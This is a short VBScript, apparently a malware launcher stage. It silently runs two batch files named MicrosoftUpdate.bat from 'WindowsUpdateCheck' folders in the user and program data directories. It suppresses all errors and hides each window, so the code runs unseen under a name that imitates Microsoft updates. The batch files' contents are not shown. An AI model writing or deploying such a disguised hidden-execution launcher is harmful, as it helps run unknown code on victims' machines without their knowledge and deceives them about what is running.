On Error Resume Next
Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run "%APPDATA%\WindowsUpdateCheck\MicrosoftUpdate.bat",0,True
WshShell.Run "%PROGRAMDATA%\WindowsUpdateCheck\MicrosoftUpdate.bat",0,True
